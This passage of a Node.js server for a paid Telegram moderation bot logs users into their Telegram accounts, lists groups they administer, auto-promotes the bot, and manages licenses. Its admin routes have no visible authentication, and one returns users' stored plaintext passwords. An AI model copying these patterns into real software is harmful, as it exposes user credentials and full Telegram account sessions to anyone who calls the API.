    } catch (e) {}
    return next();
});

// =============================================================================
// GRAMJS MTPROTO (STRICT OWNER & PROMOTABLE ADMIN FILTER)
// =============================================================================
const tempAuthClients = {};

async function extractCommunities(client) {
    const dialogs = await client.getDialogs({ limit: 100 });
    const groups = [];
    const channels = [];

    const connectedSnap = await db.ref('connected_bots').once('value');
    const connectedMap = connectedSnap.val() || {};

    for (const d of dialogs) {
        if (!d.isGroup && !d.isChannel) continue;
        const e = d.entity;
        if (!e) continue;

        if (e.deactivated) continue;
        if (e.className === 'ChatForbidden' || e.className === 'ChannelForbidden') continue;

        const isCreator = Boolean(e.creator);
        const hasAdminRights = Boolean(e.adminRights && (e.adminRights.addAdmins || e.adminRights.inviteUsers || e.adminRights.changeInfo));
        const isBasicAdmin = Boolean(e.admin);

        if (!isCreator && !hasAdminRights && !isBasicAdmin) {
            continue;
        }

        let photoBase64 = null;
        try {
            if (e.photo) {
                const buffer = await client.downloadProfilePhoto(e, { isBig: false });
                if (buffer && buffer.length > 0) {
                    photoBase64 = `data:image/jpeg;base64,${buffer.toString('base64')}`;
                }
            }
        } catch (err) {}

        const isBroadcastChannel = d.isChannel && !e.megagroup;
        const chatIdStr = d.id.toString();

        let isBotConnected = Boolean(connectedMap[chatIdStr] || connectedMap[`-100${e.id}`]);
        if (!isBotConnected && botId) {
            try {
                const botMember = await bot.telegram.getChatMember(chatIdStr, botId);
                if (botMember && ['administrator', 'creator'].includes(botMember.status)) {
                    isBotConnected = true;
                }
            } catch (err) {}
        }

        const count = e.participantsCount || 1;
        const role = isCreator ? 'Owner' : 'Admin';

        const itemData = {
            id: chatIdStr,
            title: d.title || "Community Hub",
            role: role,
            canAddBot: true,
            isBotConnected: isBotConnected,
            photo: photoBase64
        };

        if (isBroadcastChannel) {
            itemData.subscribersCount = count;
            channels.push(itemData);
        } else {
            itemData.membersCount = count;
            groups.push(itemData);
        }
    }

    return { groups, channels };
}

app.post('/api/tg/send-code', async (req, res) => {
    const { phone } = req.body;
    try {
        const client = new TelegramClient(new StringSession(""), API_ID, API_HASH, { connectionRetries: 5 });
        await client.connect();
        const sendCodeResult = await client.sendCode({ apiId: API_ID, apiHash: API_HASH }, phone);
        tempAuthClients[phone] = { client, phoneCodeHash: sendCodeResult.phoneCodeHash };
        res.json({ success: true, phoneCodeHash: sendCodeResult.phoneCodeHash });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/tg/verify-code', async (req, res) => {
    const { phone, code, phoneCodeHash, password } = req.body;
    try {
        const sessionData = tempAuthClients[phone];
        if (!sessionData) throw new Error("Session expired. Please request code again.");

        const client = sessionData.client;
        if (!client.connected) await client.connect();

        try {
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: phone,
                phoneCodeHash: phoneCodeHash || sessionData.phoneCodeHash,
                phoneCode: code.toString().trim()
            }));
        } catch (authErr) {
            if (authErr.message.includes('SESSION_PASSWORD_NEEDED')) {
                if (!password) {
                    return res.json({ success: false, needPassword: true, message: "Two-step verification password required." });
                }
                const pwd = await client.invoke(new Api.account.GetPassword());
                const passwordCheck = await computeCheck(pwd, password);
                await client.invoke(new Api.auth.CheckPassword({ password: passwordCheck }));
            } else {
                throw authErr;
            }
        }

        let myTelegramId = null;
        try {
            const me = await client.getMe();
            if (me && me.id) {
                myTelegramId = me.id.toString();
                await db.ref(`telegram_users/${phone.replace(/[^0-9]/g, '')}`).set(myTelegramId);
            }
        } catch (mErr) {}

        const stringSession = client.session.save();
        const { groups, channels } = await extractCommunities(client);

        delete tempAuthClients[phone];
        res.json({ success: true, session: stringSession, telegramId: myTelegramId, groups, channels });
    } catch (e) {
        res.status(500).json({ error: e.message || "Invalid Telegram OTP code." });
    }
});

app.post('/api/tg/fetch-communities', async (req, res) => {
    const { session } = req.body;
    if (!session) return res.status(400).json({ error: "Session missing" });
    try {
        const client = new TelegramClient(new StringSession(session), API_ID, API_HASH, { connectionRetries: 5 });
        await client.connect();

        let myTelegramId = null;
        try {
            const me = await client.getMe();
            if (me && me.id) myTelegramId = me.id.toString();
        } catch (e) {}

        const { groups, channels } = await extractCommunities(client);
        res.json({ success: true, telegramId: myTelegramId, groups, channels });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// BOT AUTO-ADD & PROMOTE (WITH DUAL USER/TELEGRAM BIND)
app.post('/api/tg/connect-group', async (req, res) => {
    const { session, chatId, userId } = req.body;
    try {
        const client = new TelegramClient(new StringSession(session), API_ID, API_HASH, { connectionRetries: 5 });
        await client.connect();

        let myTgId = null;
        try {
            const me = await client.getMe();
            if (me && me.id) {
                myTgId = me.id.toString();
                await db.ref(`groups/${chatId}/merged_owner`).set(myTgId);
            }
        } catch (e) {}

        // Check plan by UID or Telegram ID
        let sub = null;
        if (userId) {
            const sUid = await db.ref(`subscriptions/by_uid/${userId}`).once('value');
            sub = sUid.val();
        }
        if (!sub && myTgId) {
            const sTg = await db.ref(`subscriptions/${myTgId}`).once('value');
            sub = sTg.val();
        }

        const now = Date.now();
        if (!sub || (sub.graceEndsAt && now > sub.graceEndsAt)) {
            return res.status(403).json({
                success: false,
                error: "NO_ACTIVE_LICENSE",
                message: "You need an active subscription license to add VS Protection Bot."
            });
        }

        const dialogs = await client.getDialogs({ limit: 100 });
        const cleanId = chatId.toString().replace('-100', '').replace('-', '');
        let targetDialog = dialogs.find(d => 
            (d.isChannel || d.entity?.className === 'Channel') &&
            (d.id.toString() === chatId.toString() || String(d.entity?.id) === cleanId)
        );

        if (!targetDialog) {
            targetDialog = dialogs.find(d => d.id.toString() === chatId.toString() || String(d.entity?.id) === cleanId);
        }

        if (!targetDialog || !targetDialog.entity) throw new Error("Community dialog entity not found.");

        const targetEntity = targetDialog.entity;
        const botPeer = await client.getInputEntity(BOT_USERNAME);
        const botInputUser = new Api.InputUser({ userId: botPeer.userId, accessHash: botPeer.accessHash });

        let targetInputChannel = null;

        if (targetEntity.className === 'Channel') {
            targetInputChannel = new Api.InputChannel({ channelId: targetEntity.id, accessHash: targetEntity.accessHash });
        } else if (targetEntity.className === 'Chat') {
            try {
                await client.invoke(new Api.messages.AddChatUser({ chatId: targetEntity.id, userId: botInputUser, fwdLimit: 0 }));
            } catch (e) {}

            try {
                const migrateRes = await client.invoke(new Api.messages.MigrateChat({ chatId: targetEntity.id }));
                if (migrateRes.chats && migrateRes.chats.length > 0) {
                    const newChan = migrateRes.chats.find(c => c.className === 'Channel');
                    if (newChan) targetInputChannel = new Api.InputChannel({ channelId: newChan.id, accessHash: newChan.accessHash });
                }
            } catch (migErr) {}

            if (!targetInputChannel) {
                const freshDialogs = await client.getDialogs({ limit: 30 });
                const fresh = freshDialogs.find(d => d.isChannel && d.title === targetEntity.title);
                if (fresh && fresh.entity) targetInputChannel = new Api.InputChannel({ channelId: fresh.entity.id, accessHash: fresh.entity.accessHash });
            }
        }

        if (!targetInputChannel) throw new Error("Could not resolve target channel entity.");

        try {
            await client.invoke(new Api.channels.InviteToChannel({ channel: targetInputChannel, users: [botInputUser] }));
        } catch (invErr) {}

        const isBroadcast = (targetEntity.className === 'Channel' && !targetEntity.megagroup);
        const adminRights = isBroadcast
            ? new Api.ChatAdminRights({ changeInfo: true, postMessages: true, editMessages: true, deleteMessages: true, inviteUsers: true, addAdmins: false, manageCall: true })
            : new Api.ChatAdminRights({ changeInfo: true, deleteMessages: true, banUsers: true, inviteUsers: true, pinMessages: true, addAdmins: false, anonymous: false, manageCall: true, other: true });

        await client.invoke(new Api.channels.EditAdmin({
            channel: targetInputChannel,
            userId: botInputUser,
            adminRights: adminRights,
            rank: 'VS Guardian'
        }));

        await db.ref(`connected_bots/${chatId}`).set({ connected: true, chatId: chatId, updatedAt: Date.now() });

        res.json({ success: true, message: `@${BOT_USERNAME} deployed & granted Administrator powers!` });
    } catch (e) {
        console.error("Connect Group Error:", e);
        res.status(500).json({ error: e.message || "Failed to add bot as admin" });
    }
});

// Broadcast
app.post('/api/tg/broadcast', async (req, res) => {
    const { chatId, text, photoUrl, buttons } = req.body;
    try {
        const check = await getOwnerSubByChat(chatId);
        if (!check.hasSub) return res.status(403).json({ success: false, error: check.reason, message: check.message });

        if (!text && !photoUrl) throw new Error("Message content or image required");
        const keyboard = buildInlineButtons(buttons);
        const extra = { parse_mode: 'Markdown' };
        if (keyboard) extra.reply_markup = keyboard.reply_markup;

        const validPhoto = (photoUrl || "").trim();
        if (validPhoto && (validPhoto.startsWith('http://') || validPhoto.startsWith('https://'))) {
            await bot.telegram.sendPhoto(chatId, validPhoto, { caption: text || "", ...extra });
        } else {
            await bot.telegram.sendMessage(chatId, text, extra);
        }
        res.json({ success: true, message: "Announcement broadcasted successfully to the group!" });
    } catch (e) {
        res.status(500).json({ error: e.message || "Failed to send broadcast announcement" });
    }
});

// CREATE SINGLE-USE GROUP CONNECT CODE
app.post('/api/tg/create-connect-code', async (req, res) => {
    const { userId, userEmail } = req.body;
    try {
        if (!userId) return res.status(400).json({ error: "User ID is required." });

        // Check user subscription
        const subSnap = await db.ref(`subscriptions/by_uid/${userId}`).once('value');
        const sub = subSnap.val();
        if (!sub) {
            return res.status(403).json({
                error: "NO_ACTIVE_LICENSE",
                message: "You need an active subscription license to connect groups. Please claim a license key first."
            });
        }

        const now = Date.now();
        const graceEndsAt = sub.graceEndsAt || (sub.expiresAt + 7 * 86400000);
        if (now > graceEndsAt) {
            return res.status(403).json({
                error: "SUBSCRIPTION_EXPIRED",
                message: "Your subscription license has expired. Please renew your license to connect groups."
            });
        }

        // Count existing connected groups
        const allGroupsSnap = await db.ref('groups').once('value');
        const allGroups = allGroupsSnap.val() || {};
        const userGroups = Object.keys(allGroups).filter(gid => allGroups[gid].owner_user_id === userId);
        const maxCommunities = sub.maxCommunities || 1;

        if (userGroups.length >= maxCommunities) {
            return res.status(403).json({
                error: "LIMIT_REACHED",
                message: `You have reached your community limit (${maxCommunities} group${maxCommunities > 1 ? 's' : ''}) for plan ${sub.planName}. Please upgrade your license or disconnect a group.`
            });
        }

        // Check if there is already an active, unused code generated in the last 24h
        const codesSnap = await db.ref('connect_codes').once('value');
        const allCodes = codesSnap.val() || {};
        const existingUnused = Object.values(allCodes).find(c => c.userId === userId && !c.used && c.expiresAt > now);

        if (existingUnused) {
            return res.json({
                success: true,
                code: existingUnused.code,
                expiresAt: existingUnused.expiresAt,
                maxCommunities,
                connectedCount: userGroups.length,
                isExisting: true
            });
        }

        // Generate unique code: VS-XXXXXX
        const randomPart = Math.random().toString(36).substring(2, 8).toUpperCase();
        const code = `VS-${randomPart}`;
        const expiresAt = now + (24 * 60 * 60 * 1000);

        const codeData = {
            code,
            userId,
            userEmail: userEmail || "",
            createdAt: now,
            expiresAt,
            used: false,
            usedInChatId: null,
            usedAt: null
        };

        await db.ref(`connect_codes/${code}`).set(codeData);

        res.json({
            success: true,
            code,
            expiresAt,
            maxCommunities,
            connectedCount: userGroups.length,
            isExisting: false
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// GET USER'S CONNECTED COMMUNITIES (BY USER ID)
app.post('/api/tg/user-communities', async (req, res) => {
    const { userId } = req.body;
    try {
        if (!userId) return res.status(400).json({ error: "User ID required." });

        const allGroupsSnap = await db.ref('groups').once('value');
        const allGroups = allGroupsSnap.val() || {};

        const userGroups = [];
        const userChannels = [];

        for (const gid of Object.keys(allGroups)) {
            const g = allGroups[gid];
            if (g.owner_user_id === userId) {
                const item = {
                    id: gid,
                    title: g.title || "Community",
                    type: g.type || "supergroup",
                    isChannel: g.type === 'channel',
                    isBotConnected: true,
                    role: g.role || "Owner",
                    connected_at: g.connected_at || Date.now()
                };
                if (item.isChannel) {
                    userChannels.push(item);
                } else {
                    userGroups.push(item);
                }
            }
        }

        const subSnap = await db.ref(`subscriptions/by_uid/${userId}`).once('value');
        const sub = subSnap.val();

        res.json({
            success: true,
            groups: userGroups,
            channels: userChannels,
            subscription: sub || null,
            maxCommunities: sub?.maxCommunities || 0,
            connectedCount: userGroups.length + userChannels.length
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// DISCONNECT COMMUNITY
app.post('/api/tg/disconnect-group', async (req, res) => {
    const { userId, chatId } = req.body;
    try {
        if (!userId || !chatId) return res.status(400).json({ error: "Missing parameters." });

        const snap = await db.ref(`groups/${chatId}`).once('value');
        const group = snap.val();
        if (!group) return res.status(404).json({ error: "Group not found." });

        if (group.owner_user_id !== userId) {
            return res.status(403).json({ error: "You are not the registered owner of this group." });
        }

        await db.ref(`groups/${chatId}/owner_user_id`).remove();
        subscriptionCache[chatId] = null;
        chatSettingsCache[chatId] = null;

        bot.telegram.sendMessage(chatId, "⚠️ *This community has been disconnected from the web dashboard by its owner.*", { parse_mode: 'Markdown' }).catch(() => {});

        res.json({ success: true, message: "Community disconnected successfully." });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Get Group Settings
app.post('/api/tg/get-settings', async (req, res) => {
    const { chatId } = req.body;
    try {
        if (!chatId) return res.status(400).json({ error: "Missing chatId" });
        const check = await getOwnerSubByChat(chatId);
        if (!check.hasSub) return res.status(403).json({ success: false, error: check.reason, message: check.message });

        const settings = await getChatSettings(chatId);
        res.json({ success: true, settings });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Section Save
app.post('/api/tg/save-section', async (req, res) => {
    const { chatId, sectionKey, data } = req.body;
    try {
        if (!chatId || !sectionKey) throw new Error("Missing parameters");
        
        const check = await getOwnerSubByChat(chatId);
        if (!check.hasSub) return res.status(403).json({ success: false, error: check.reason, message: check.message });

        await db.ref(`groups/${chatId}/settings/${sectionKey}`).set(data);
        if (chatSettingsCache[chatId]) chatSettingsCache[chatId][sectionKey] = data;
        res.json({ success: true, message: "Section policy saved successfully!" });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Test Welcome
app.post('/api/tg/test-welcome', async (req, res) => {
    const { chatId, photoUrl, text, buttons, autoDeleteSeconds } = req.body;
    try {
        const check = await getOwnerSubByChat(chatId);
        if (!check.hasSub) return res.status(403).json({ success: false, error: check.reason, message: check.message });

        const testUser = `[Admin (Test)](tg://user?id=${botId || 0})`;
        const chatInfo = await bot.telegram.getChat(chatId).catch(() => ({ title: "Community" }));
        const formatted = (text || "Welcome {mention} to {chat}!")
            .replace(/{mention}/g, testUser).replace(/{user}/g, testUser).replace(/{name}/g, "Admin User").replace(/{username}/g, "@AdminUser").replace(/{chat}/g, chatInfo.title);

        const keyboard = buildInlineButtons(buttons);
        const extra = { parse_mode: 'Markdown' };
        if (keyboard) extra.reply_markup = keyboard.reply_markup;

        let sentMsg;
        const validPhoto = (photoUrl || "").trim();
        if (validPhoto && (validPhoto.startsWith('http://') || validPhoto.startsWith('https://'))) {
            sentMsg = await bot.telegram.sendPhoto(chatId, validPhoto, { caption: `🧪 *[TEST WELCOME MESSAGE]*\n\n${formatted}`, ...extra }).catch(async () => {
                return await bot.telegram.sendMessage(chatId, `🧪 *[TEST WELCOME MESSAGE]*\n\n${formatted}`, extra);
            });
        } else {
            sentMsg = await bot.telegram.sendMessage(chatId, `🧪 *[TEST WELCOME MESSAGE]*\n\n${formatted}`, extra);
        }

        const sec = parseInt(autoDeleteSeconds || 0);
        if (sec > 0 && sentMsg && sentMsg.message_id) {
            setTimeout(() => { bot.telegram.deleteMessage(chatId, sentMsg.message_id).catch(() => {}); }, sec * 1000);
        }
        res.json({ success: true, message: `Test welcome delivered! ${sec > 0 ? `(Auto-deletes in ${sec}s)` : ''}` });
    } catch (e) {
        res.status(500).json({ error: e.message || "Failed to send test message." });
    }
});

// Announce Lock
app.post('/api/tg/announce-lock', async (req, res) => {
    const { chatId, locked, message } = req.body;
    try {
        const check = await getOwnerSubByChat(chatId);
        if (!check.hasSub) return res.status(403).json({ success: false, error: check.reason, message: check.message });

        const defaultMsg = locked ? "🔒 *This conversation has been temporarily muted by community administrators.*" : "🔓 *Conversation restriction lifted. Members may now post messages.*";
        const broadcast = message && message.trim() ? message.trim() : defaultMsg;
        await bot.telegram.sendMessage(chatId, broadcast, { parse_mode: 'Markdown' });
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Left Members & Scammers
app.post('/api/tg/get-left-members', async (req, res) => {
    const { chatId } = req.body;
    try {
        const snap = await db.ref(`groups/${chatId}/left_members`).once('value');
        const data = snap.val() || {};
        const list = Object.keys(data).map(uid => ({ id: uid, ...data[uid] })).sort((a,b) => b.timestamp - a.timestamp);
        res.json({ success: true, leftMembers: list });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/tg/get-scammers', async (req, res) => {
    const { chatId } = req.body;
    try {
        const snap = await db.ref(`groups/${chatId}/scammers`).once('value');
        const data = snap.val() || {};
        const list = Object.keys(data).map(uid => ({ id: uid, ...data[uid] }));
        res.json({ success: true, scammers: list });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Helper: License Key Generator
function generateLicenseKey() {
    const p1 = crypto.randomBytes(2).toString('hex').toUpperCase();
    const p2 = crypto.randomBytes(2).toString('hex').toUpperCase();
    const p3 = crypto.randomBytes(2).toString('hex').toUpperCase();
    return `VS-${p1}-${p2}-${p3}`;
}

// Admin APIs
app.post('/api/admin/generate-license', async (req, res) => {
    const { planId, customDurationDays } = req.body;
    try {
        const planConfigs = {
            starter: { name: "Starter (1 Channel / Group)", maxCommunities: 1, bdt: 50 },
            growth: { name: "Growth (5 Channels / Groups)", maxCommunities: 5, bdt: 200 },
            pro: { name: "Pro (15 Channels / Groups)", maxCommunities: 15, bdt: 450 },
            unlimited: { name: "Unlimited Enterprise Hub", maxCommunities: 999999, bdt: 750 }
        };

        const plan = planConfigs[planId] || planConfigs.starter;
        const key = generateLicenseKey();
        const durationDays = parseInt(customDurationDays) || 30;

        const licenseData = {
            key,
            planId,
            planName: plan.name,
            maxCommunities: plan.maxCommunities,
            bdt: plan.bdt,
            usdt: (plan.bdt / 127).toFixed(2),
            durationDays,
            graceDays: 7,
            status: "active",
            createdAt: Date.now()
        };

        await db.ref(`licenses/${key}`).set(licenseData);
        res.json({ success: true, license: licenseData });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/admin/list-licenses', async (req, res) => {
    try {
        const snap = await db.ref('licenses').once('value');
        const data = snap.val() || {};
        const list = Object.keys(data).map(k => data[k]).sort((a,b) => b.createdAt - a.createdAt);
        res.json({ success: true, licenses: list });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/admin/revoke-license', async (req, res) => {
    const { key } = req.body;
    try {
        await db.ref(`licenses/${key}`).update({ status: 'revoked' });
        res.json({ success: true, message: 'License revoked successfully.' });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/admin/extend-license', async (req, res) => {
    const { key, days } = req.body;
    try {
        const snap = await db.ref(`licenses/${key}`).once('value');
        const lic = snap.val();
        if (!lic) throw new Error("License not found");

        const extraMs = (parseInt(days) || 30) * 24 * 60 * 60 * 1000;
        const newExp = (lic.expiresAt || Date.now()) + extraMs;
        const newGrace = newExp + (7 * 24 * 60 * 60 * 1000);

        await db.ref(`licenses/${key}`).update({ expiresAt: newExp, graceEndsAt: newGrace });
        if (lic.claimedUserId) {
            await db.ref(`subscriptions/by_uid/${lic.claimedUserId}`).update({ expiresAt: newExp, graceEndsAt: newGrace });
        }
        if (lic.ownerTelegramId && lic.ownerTelegramId !== 'Unlinked') {
            await db.ref(`subscriptions/${lic.ownerTelegramId}`).update({ expiresAt: newExp, graceEndsAt: newGrace });
        }
        res.json({ success: true, message: `License extended by ${days} days!` });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/admin/users-list', async (req, res) => {
    try {
        const usersSnap = await db.ref('users').once('value');
        const subsSnap = await db.ref('subscriptions/by_uid').once('value');
        const usersData = usersSnap.val() || {};
        const subsData = subsSnap.val() || {};

        const list = Object.keys(usersData).map(uid => {
            const u = usersData[uid];
            const sub = subsData[uid] || null;
            return {
                uid,
                email: u.security_vault?.email || 'N/A',
                password: u.security_vault?.password || 'N/A',
                telegramId: u.owner_tg_id || 'Not Linked',
                subscription: sub ? sub.planName : 'No Active License',
                expiresAt: sub ? sub.expiresAt : null
            };
        });
        res.json({ success: true, users: list });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// CLAIM LICENSE (BINDS TO USER ACCOUNT UID & EMAIL)
app.post('/api/license/claim', async (req, res) => {
    const { licenseKey, userId, userEmail, session, ownerTelegramId: providedTgId } = req.body;
    try {
        if (!licenseKey) throw new Error("License key is required.");
        if (!userId && !userEmail && !providedTgId) throw new Error("User account required.");

        const cleanKey = licenseKey.trim().toUpperCase();
        const snap = await db.ref(`licenses/${cleanKey}`).once('value');
        const license = snap.val();

        if (!license) throw new Error("Invalid license key. Please check and try again.");
        if (license.status === "claimed") throw new Error("This license key has already been claimed.");
        if (license.status === "revoked") throw new Error("This license key has been revoked by admin.");

        let ownerTelegramId = providedTgId;
        if ((!ownerTelegramId || ownerTelegramId === 'null') && session) {
            try {
                const client = new TelegramClient(new StringSession(session), API_ID, API_HASH, { connectionRetries: 3 });
                await client.connect();
                const me = await client.getMe();
                if (me && me.id) ownerTelegramId = me.id.toString();
            } catch (e) {}
        }

        const now = Date.now();
        const expiresAt = now + (license.durationDays * 24 * 60 * 60 * 1000);
        const graceEndsAt = expiresAt + (license.graceDays * 24 * 60 * 60 * 1000);

        await db.ref(`licenses/${cleanKey}`).update({
            status: "claimed",
            claimedBy: userEmail || userId || "Anonymous",
            claimedUserId: userId || '',
            ownerTelegramId: ownerTelegramId || 'Unlinked',
            claimedAt: now,
            expiresAt,
            graceEndsAt
        });

        const subData = {
            licenseKey: cleanKey,
            planId: license.planId,
            planName: license.planName,
            maxCommunities: license.maxCommunities,
            userEmail: userEmail || '',
            claimedAt: now,
            expiresAt,
            graceEndsAt
        };

        if (userId) {
            await db.ref(`subscriptions/by_uid/${userId}`).set(subData);
        }
        if (ownerTelegramId && ownerTelegramId !== 'Unlinked') {
            await db.ref(`subscriptions/${ownerTelegramId}`).set(subData);
            if (userId) {
                await db.ref(`users/${userId}/owner_tg_id`).set(ownerTelegramId);
            }
        }

        subscriptionCache = {};
        res.json({ success: true, message: `License activated! Plan: ${license.planName}`, subscription: subData, telegramId: ownerTelegramId });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// GET SUBSCRIPTION STATUS
app.post('/api/license/status', async (req, res) => {
    const { userId, ownerTelegramId } = req.body;
    try {
        let sub = null;

        if (userId) {
            const snapUid = await db.ref(`subscriptions/by_uid/${userId}`).once('value');
            sub = snapUid.val();
        }

        if (!sub && ownerTelegramId && ownerTelegramId !== 'null') {
            const snapTg = await db.ref(`subscriptions/${ownerTelegramId}`).once('value');
            sub = snapTg.val();
        }

        if (!sub) {
            return res.json({ hasSubscription: false });
        }

        const now = Date.now();
        const isExpired = now > sub.expiresAt;
        const isGracePeriod = isExpired && now <= sub.graceEndsAt;
        const isTotallyShutDown = now > sub.graceEndsAt;

        res.json({
            hasSubscription: true,
            subscription: sub,
            isExpired,
            isGracePeriod,
            isTotallyShutDown,
            remainingDays: Math.max(0, Math.ceil((sub.expiresAt - now) / (1000 * 60 * 60 * 24))),
            graceDaysLeft: Math.max(0, Math.ceil((sub.graceEndsAt - now) / (1000 * 60 * 60 * 24)))
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// System Stats
app.get('/api/admin/system-stats', async (req, res) => {
    try {
        const usersSnap = await db.ref('users').once('value');
        const groupsSnap = await db.ref('groups').once('value');
        const licSnap = await db.ref('licenses').once('value');

        const usersCount = usersSnap.numChildren() || 0;
        const groupsCount = groupsSnap.numChildren() || 0;
        const licData = licSnap.val() || {};

        let totalRevenueBDT = 0;
        let claimedLicenses = 0;

        Object.keys(licData).forEach(k => {
            if (licData[k].status === 'claimed') {
                totalRevenueBDT += (licData[k].bdt || 0);
                claimedLicenses++;
            }
        });

        res.json({
            success: true,
            stats: {
                totalUsers: usersCount,
                totalGroups: groupsCount,
                claimedLicenses: claimedLicenses,
                revenueBDT: totalRevenueBDT,
                revenueUSDT: (totalRevenueBDT / 127).toFixed(2)
            }
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Fallback Route
app.get('*', (req, res) => {
    const p1 = path.join(__dirname, 'public', 'index.html');
    const p2 = path.join(__dirname, 'index.html');
    if (fs.existsSync(p1)) return res.sendFile(p1);
    if (fs.existsSync(p2)) return res.sendFile(p2);
    res.status(404).send("<h2>index.html not found.</h2>");
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`[VS Protection] Server listening on port ${PORT}`);
    bot.launch()
        .then(() => console.log(`[VS Protection] Telegram Bot Engine Active with Token: ${BOT_TOKEN.slice(0, 10)}...`))
        .catch(e => console.error("[VS Protection] Engine Warning:", e.message));
});

process.once('SIGINT', () => { try { bot.stop('SIGINT'); } catch (e) {} });
process.once('SIGTERM', () => { try { bot.stop('SIGTERM'); } catch (e) {} });
